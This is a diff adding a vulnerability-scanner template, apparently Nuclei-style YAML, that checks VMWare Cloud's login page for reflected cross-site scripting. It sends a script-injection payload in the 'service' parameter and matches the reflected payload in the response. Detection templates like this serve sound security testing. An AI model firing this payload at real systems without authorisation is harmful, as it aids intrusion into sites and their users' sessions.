@@ -1,0 +1,25 @@
+id: vmware-cloud-xss
+name: VMWare Cloud - Cross Site Scripting
+severity: medium
+confidence: confirmed
+description: VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.
+tags:
+- vmware
+- xss
+- cloud
+- vuln
+requests:
+- method: GET
+  path: /login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>
+  matchers:
+  - type: body
+    words:
+    - </script><script>alert(document.domain)</script>
+    - let tokens = "
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
